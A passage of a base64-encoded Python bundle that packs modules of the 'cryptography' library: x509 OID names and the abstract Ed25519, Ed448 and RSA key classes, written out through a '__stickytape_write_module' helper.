pb24iLFxyXG4gICAgRXh0ZW5kZWRLZXlVc2FnZU9JRC5USU1FX1NUQU1QSU5HOiAidGltZVN0YW1waW5nIixcclxuICAgIEV4dGVuZGVkS2V5VXNhZ2VPSUQuT0NTUF9TSUdOSU5HOiAiT0NTUFNpZ25pbmciLFxyXG4gICAgRXh0ZW5kZWRLZXlVc2FnZU9JRC5TTUFSVENBUkRfTE9HT046ICJtc1NtYXJ0Y2FyZExvZ2luIixcclxuICAgIEV4dGVuZGVkS2V5VXNhZ2VPSUQuS0VSQkVST1NfUEtJTklUX0tEQzogInBrSW5pdEtEQyIsXHJcbiAgICBFeHRlbnNpb25PSUQuU1VCSkVDVF9ESVJFQ1RPUllfQVRUUklCVVRFUzogInN1YmplY3REaXJlY3RvcnlBdHRyaWJ1dGVzIixcclxuICAgIEV4dGVuc2lvbk9JRC5TVUJKRUNUX0tFWV9JREVOVElGSUVSOiAic3ViamVjdEtleUlkZW50aWZpZXIiLFxyXG4gICAgRXh0ZW5zaW9uT0lELktFWV9VU0FHRTogImtleVVzYWdlIixcclxuICAgIEV4dGVuc2lvbk9JRC5TVUJKRUNUX0FMVEVSTkFUSVZFX05BTUU6ICJzdWJqZWN0QWx0TmFtZSIsXHJcbiAgICBFeHRlbnNpb25PSUQuSVNTVUVSX0FMVEVSTkFUSVZFX05BTUU6ICJpc3N1ZXJBbHROYW1lIixcclxuICAgIEV4dGVuc2lvbk9JRC5CQVNJQ19DT05TVFJBSU5UUzogImJhc2ljQ29uc3RyYWludHMiLFxyXG4gICAgRXh0ZW5zaW9uT0lELlBSRUNFUlRfU0lHTkVEX0NFUlRJRklDQVRFX1RJTUVTVEFNUFM6IChcclxuICAgICAgICAic2lnbmVkQ2VydGlmaWNhdGVUaW1lc3RhbXBMaXN0IlxyXG4gICAgKSxcclxuICAgIEV4dGVuc2lvbk9JRC5TSUdORURfQ0VSVElGSUNBVEVfVElNRVNUQU1QUzogKFxyXG4gICAgICAgICJzaWduZWRDZXJ0aWZpY2F0ZVRpbWVzdGFtcExpc3QiXHJcbiAgICApLFxyXG4gICAgRXh0ZW5zaW9uT0lELlBSRUNFUlRfUE9JU09OOiAiY3RQb2lzb24iLFxyXG4gICAgQ1JMRW50cnlFeHRlbnNpb25PSUQuQ1JMX1JFQVNPTjogImNSTFJlYXNvbiIsXHJcbiAgICBDUkxFbnRyeUV4dGVuc2lvbk9JRC5JTlZBTElESVRZX0RBVEU6ICJpbnZhbGlkaXR5RGF0ZSIsXHJcbiAgICBDUkxFbnRyeUV4dGVuc2lvbk9JRC5DRVJUSUZJQ0FURV9JU1NVRVI6ICJjZXJ0aWZpY2F0ZUlzc3VlciIsXHJcbiAgICBFeHRlbnNpb25PSUQuTkFNRV9DT05TVFJBSU5UUzogIm5hbWVDb25zdHJhaW50cyIsXHJcbiAgICBFeHRlbnNpb25PSUQuQ1JMX0RJU1RSSUJVVElPTl9QT0lOVFM6ICJjUkxEaXN0cmlidXRpb25Qb2ludHMiLFxyXG4gICAgRXh0ZW5zaW9uT0lELkNFUlRJRklDQVRFX1BPTElDSUVTOiAiY2VydGlmaWNhdGVQb2xpY2llcyIsXHJcbiAgICBFeHRlbnNpb25PSUQuUE9MSUNZX01BUFBJTkdTOiAicG9saWN5TWFwcGluZ3MiLFxyXG4gICAgRXh0ZW5zaW9uT0lELkFVVEhPUklUWV9LRVlfSURFTlRJRklFUjogImF1dGhvcml0eUtleUlkZW50aWZpZXIiLFxyXG4gICAgRXh0ZW5zaW9uT0lELlBPTElDWV9DT05TVFJBSU5UUzogInBvbGljeUNvbnN0cmFpbnRzIixcclxuICAgIEV4dGVuc2lvbk9JRC5FWFRFTkRFRF9LRVlfVVNBR0U6ICJleHRlbmRlZEtleVVzYWdlIixcclxuICAgIEV4dGVuc2lvbk9JRC5GUkVTSEVTVF9DUkw6ICJmcmVzaGVzdENSTCIsXHJcbiAgICBFeHRlbnNpb25PSUQuSU5ISUJJVF9BTllfUE9MSUNZOiAiaW5oaWJpdEFueVBvbGljeSIsXHJcbiAgICBFeHRlbnNpb25PSUQuSVNTVUlOR19ESVNUUklCVVRJT05fUE9JTlQ6ICgiaXNzdWluZ0Rpc3RyaWJ1dGlvblBvaW50IiksXHJcbiAgICBFeHRlbnNpb25PSUQuQVVUSE9SSVRZX0lORk9STUFUSU9OX0FDQ0VTUzogImF1dGhvcml0eUluZm9BY2Nlc3MiLFxyXG4gICAgRXh0ZW5zaW9uT0lELlNVQkpFQ1RfSU5GT1JNQVRJT05fQUNDRVNTOiAic3ViamVjdEluZm9BY2Nlc3MiLFxyXG4gICAgRXh0ZW5zaW9uT0lELk9DU1BfTk9fQ0hFQ0s6ICJPQ1NQTm9DaGVjayIsXHJcbiAgICBFeHRlbnNpb25PSUQuQ1JMX05VTUJFUjogImNSTE51bWJlciIsXHJcbiAgICBFeHRlbnNpb25PSUQuREVMVEFfQ1JMX0lORElDQVRPUjogImRlbHRhQ1JMSW5kaWNhdG9yIixcclxuICAgIEV4dGVuc2lvbk9JRC5UTFNfRkVBVFVSRTogIlRMU0ZlYXR1cmUiLFxyXG4gICAgQXV0aG9yaXR5SW5mb3JtYXRpb25BY2Nlc3NPSUQuT0NTUDogIk9DU1AiLFxyXG4gICAgQXV0aG9yaXR5SW5mb3JtYXRpb25BY2Nlc3NPSUQuQ0FfSVNTVUVSUzogImNhSXNzdWVycyIsXHJcbiAgICBTdWJqZWN0SW5mb3JtYXRpb25BY2Nlc3NPSUQuQ0FfUkVQT1NJVE9SWTogImNhUmVwb3NpdG9yeSIsXHJcbiAgICBDZXJ0aWZpY2F0ZVBvbGljaWVzT0lELkNQU19RVUFMSUZJRVI6ICJpZC1xdC1jcHMiLFxyXG4gICAgQ2VydGlmaWNhdGVQb2xpY2llc09JRC5DUFNfVVNFUl9OT1RJQ0U6ICJpZC1xdC11bm90aWNlIixcclxuICAgIE9DU1BFeHRlbnNpb25PSUQuTk9OQ0U6ICJPQ1NQTm9uY2UiLFxyXG4gICAgQXR0cmlidXRlT0lELkNIQUxMRU5HRV9QQVNTV09SRDogImNoYWxsZW5nZVBhc3N3b3JkIixcclxufVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL2FzeW1tZXRyaWMvZWQyNTUxOS5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcblxyXG5pbXBvcnQgYWJjXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5leGNlcHRpb25zIGltcG9ydCBVbnN1cHBvcnRlZEFsZ29yaXRobSwgX1JlYXNvbnNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IF9zZXJpYWxpemF0aW9uXHJcblxyXG5cclxuX0VEMjU1MTlfS0VZX1NJWkUgPSAzMlxyXG5fRUQyNTUxOV9TSUdfU0laRSA9IDY0XHJcblxyXG5cclxuY2xhc3MgRWQyNTUxOVB1YmxpY0tleShtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZnJvbV9wdWJsaWNfYnl0ZXMoY2xzLCBkYXRhOiBieXRlcykgLT4gIkVkMjU1MTlQdWJsaWNLZXkiOlxyXG4gICAgICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmRcclxuXHJcbiAgICAgICAgaWYgbm90IGJhY2tlbmQuZWQyNTUxOV9zdXBwb3J0ZWQoKTpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAiZWQyNTUxOSBpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoaXMgdmVyc2lvbiBvZiBPcGVuU1NMLiIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9QVUJMSUNfS0VZX0FMR09SSVRITSxcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gYmFja2VuZC5lZDI1NTE5X2xvYWRfcHVibGljX2J5dGVzKGRhdGEpXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBfc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IF9zZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIHNlcmlhbGl6ZWQgYnl0ZXMgb2YgdGhlIHB1YmxpYyBrZXkuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHZlcmlmeShzZWxmLCBzaWduYXR1cmU6IGJ5dGVzLCBkYXRhOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBWZXJpZnkgdGhlIHNpZ25hdHVyZS5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5jbGFzcyBFZDI1NTE5UHJpdmF0ZUtleShtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZ2VuZXJhdGUoY2xzKSAtPiAiRWQyNTUxOVByaXZhdGVLZXkiOlxyXG4gICAgICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmRcclxuXHJcbiAgICAgICAgaWYgbm90IGJhY2tlbmQuZWQyNTUxOV9zdXBwb3J0ZWQoKTpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAiZWQyNTUxOSBpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoaXMgdmVyc2lvbiBvZiBPcGVuU1NMLiIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9QVUJMSUNfS0VZX0FMR09SSVRITSxcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gYmFja2VuZC5lZDI1NTE5X2dlbmVyYXRlX2tleSgpXHJcblxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZnJvbV9wcml2YXRlX2J5dGVzKGNscywgZGF0YTogYnl0ZXMpIC0+ICJFZDI1NTE5UHJpdmF0ZUtleSI6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuICAgICAgICBpZiBub3QgYmFja2VuZC5lZDI1NTE5X3N1cHBvcnRlZCgpOlxyXG4gICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJlZDI1NTE5IGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhpcyB2ZXJzaW9uIG9mIE9wZW5TU0wuIixcclxuICAgICAgICAgICAgICAgIF9SZWFzb25zLlVOU1VQUE9SVEVEX1BVQkxJQ19LRVlfQUxHT1JJVEhNLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBiYWNrZW5kLmVkMjU1MTlfbG9hZF9wcml2YXRlX2J5dGVzKGRhdGEpXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHB1YmxpY19rZXkoc2VsZikgLT4gRWQyNTUxOVB1YmxpY0tleTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgRWQyNTUxOVB1YmxpY0tleSBkZXJpdmVkIGZyb20gdGhlIHByaXZhdGUga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwcml2YXRlX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IF9zZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogX3NlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdCxcclxuICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobTogX3NlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb24sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBzZXJpYWxpemVkIGJ5dGVzIG9mIHRoZSBwcml2YXRlIGtleS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgc2lnbihzZWxmLCBkYXRhOiBieXRlcykgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2lnbnMgdGhlIGRhdGEuXHJcbiAgICAgICAgIiIiXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L3ByaW1pdGl2ZXMvYXN5bW1ldHJpYy9lZDQ0OC5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcblxyXG5pbXBvcnQgYWJjXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5leGNlcHRpb25zIGltcG9ydCBVbnN1cHBvcnRlZEFsZ29yaXRobSwgX1JlYXNvbnNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IF9zZXJpYWxpemF0aW9uXHJcblxyXG5cclxuY2xhc3MgRWQ0NDhQdWJsaWNLZXkobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGZyb21fcHVibGljX2J5dGVzKGNscywgZGF0YTogYnl0ZXMpIC0+ICJFZDQ0OFB1YmxpY0tleSI6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuICAgICAgICBpZiBub3QgYmFja2VuZC5lZDQ0OF9zdXBwb3J0ZWQoKTpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAiZWQ0NDggaXMgbm90IHN1cHBvcnRlZCBieSB0aGlzIHZlcnNpb24gb2YgT3BlblNTTC4iLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfUFVCTElDX0tFWV9BTEdPUklUSE0sXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgcmV0dXJuIGJhY2tlbmQuZWQ0NDhfbG9hZF9wdWJsaWNfYnl0ZXMoZGF0YSlcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IF9zZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogX3NlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgc2VyaWFsaXplZCBieXRlcyBvZiB0aGUgcHVibGljIGtleS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgdmVyaWZ5KHNlbGYsIHNpZ25hdHVyZTogYnl0ZXMsIGRhdGE6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFZlcmlmeSB0aGUgc2lnbmF0dXJlLlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbmNsYXNzIEVkNDQ4UHJpdmF0ZUtleShtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZ2VuZXJhdGUoY2xzKSAtPiAiRWQ0NDhQcml2YXRlS2V5IjpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kXHJcblxyXG4gICAgICAgIGlmIG5vdCBiYWNrZW5kLmVkNDQ4X3N1cHBvcnRlZCgpOlxyXG4gICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJlZDQ0OCBpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoaXMgdmVyc2lvbiBvZiBPcGVuU1NMLiIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9QVUJMSUNfS0VZX0FMR09SSVRITSxcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBiYWNrZW5kLmVkNDQ4X2dlbmVyYXRlX2tleSgpXHJcblxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZnJvbV9wcml2YXRlX2J5dGVzKGNscywgZGF0YTogYnl0ZXMpIC0+ICJFZDQ0OFByaXZhdGVLZXkiOlxyXG4gICAgICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmRcclxuXHJcbiAgICAgICAgaWYgbm90IGJhY2tlbmQuZWQ0NDhfc3VwcG9ydGVkKCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgImVkNDQ4IGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhpcyB2ZXJzaW9uIG9mIE9wZW5TU0wuIixcclxuICAgICAgICAgICAgICAgIF9SZWFzb25zLlVOU1VQUE9SVEVEX1BVQkxJQ19LRVlfQUxHT1JJVEhNLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBiYWNrZW5kLmVkNDQ4X2xvYWRfcHJpdmF0ZV9ieXRlcyhkYXRhKVxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwdWJsaWNfa2V5KHNlbGYpIC0+IEVkNDQ4UHVibGljS2V5OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBFZDQ0OFB1YmxpY0tleSBkZXJpdmVkIGZyb20gdGhlIHByaXZhdGUga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBzaWduKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBTaWducyB0aGUgZGF0YS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHJpdmF0ZV9ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBfc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IF9zZXJpYWxpemF0aW9uLlByaXZhdGVGb3JtYXQsXHJcbiAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG06IF9zZXJpYWxpemF0aW9uLktleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgc2VyaWFsaXplZCBieXRlcyBvZiB0aGUgcHJpdmF0ZSBrZXkuXHJcbiAgICAgICAgIiIiXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L3ByaW1pdGl2ZXMvYXN5bW1ldHJpYy9yc2EucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGFiY1xyXG5pbXBvcnQgdHlwaW5nXHJcbmZyb20gbWF0aCBpbXBvcnQgZ2NkXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgX3NlcmlhbGl6YXRpb24sIGhhc2hlc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5fYXN5bW1ldHJpYyBpbXBvcnQgQXN5bW1ldHJpY1BhZGRpbmdcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYyBpbXBvcnQgKFxyXG4gICAgdXRpbHMgYXMgYXN5bV91dGlscyxcclxuKVxyXG5cclxuXHJcbmNsYXNzIFJTQVByaXZhdGVLZXkobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBkZWNyeXB0KHNlbGYsIGNpcGhlcnRleHQ6IGJ5dGVzLCBwYWRkaW5nOiBBc3ltbWV0cmljUGFkZGluZykgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgRGVjcnlwdHMgdGhlIHByb3ZpZGVkIGNpcGhlcnRleHQuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBiaXQgbGVuZ3RoIG9mIHRoZSBwdWJsaWMgbW9kdWx1cy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiAiUlNBUHVibGljS2V5IjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgUlNBUHVibGljS2V5IGFzc29jaWF0ZWQgd2l0aCB0aGlzIHByaXZhdGUga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBzaWduKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgcGFkZGluZzogQXN5bW1ldHJpY1BhZGRpbmcsXHJcbiAgICAgICAgYWxnb3JpdGhtOiB0eXBpbmcuVW5pb25bYXN5bV91dGlscy5QcmVoYXNoZWQsIGhhc2hlcy5IYXNoQWxnb3JpdGhtXSxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2lnbnMgdGhlIGRhdGEuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHByaXZhdGVfbnVtYmVycyhzZWxmKSAtPiAiUlNBUHJpdmF0ZU51bWJlcnMiOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgYW4gUlNBUHJpdmF0ZU51bWJlcnMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHByaXZhdGVfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogX3NlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBfc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LFxyXG4gICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtOiBfc2VyaWFsaXphdGlvbi5LZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbixcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0aGUga2V5IHNlcmlhbGl6ZWQgYXMgYnl0ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuUlNBUHJpdmF0ZUtleVdpdGhTZXJpYWxpemF0aW9uID0gUlNBUHJpdmF0ZUtleVxyXG5cclxuXHJcbmNsYXNzIFJTQVB1YmxpY0tleShtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGVuY3J5cHQoc2VsZiwgcGxhaW50ZXh0OiBieXRlcywgcGFkZGluZzogQXN5bW1ldHJpY1BhZGRpbmcpIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEVuY3J5cHRzIHRoZSBnaXZlbiBwbGFpbnRleHQuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBiaXQgbGVuZ3RoIG9mIHRoZSBwdWJsaWMgbW9kdWx1cy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX251bWJlcnMoc2VsZikgLT4gIlJTQVB1YmxpY051bWJlcnMiOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgYW4gUlNBUHVibGljTnVtYmVyc1xyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogX3NlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBfc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQsXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIGtleSBzZXJpYWxpemVkIGFzIGJ5dGVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiB2ZXJpZnkoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBzaWduYXR1cmU6IGJ5dGVzLFxyXG4gICAgICAgIGRhdGE6IGJ5dGVzLFxyXG4gICAgICAgIHBhZGRpbmc6IEFzeW1tZXRyaWNQYWRkaW5nLFxyXG4gICAgICAgIGFsZ29yaXRobTogdHlwaW5nLlVuaW9uW2FzeW1fdXRpbHMuUHJlaGFzaGVkLCBoYXNoZXMuSGFzaEFsZ29yaXRobV0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVmVyaWZpZXMgdGhlIHNpZ25hdHVyZSBvZiB0aGUgZGF0YS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcmVjb3Zlcl9kYXRhX2Zyb21fc2lnbmF0dXJlKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgc2lnbmF0dXJlOiBieXRlcyxcclxuICAgICAgICBwYWRkaW5nOiBBc3ltbWV0cmljUGFkZGluZyxcclxuICAgICAgICBhbGdvcml0aG06IHR5cGluZy5PcHRpb25hbFtoYXNoZXMuSGFzaEFsZ29yaXRobV0sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJlY292ZXJzIHRoZSBvcmlnaW5hbCBkYXRhIGZyb20gdGhlIHNpZ25hdHVyZS5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5SU0FQdWJsaWNLZX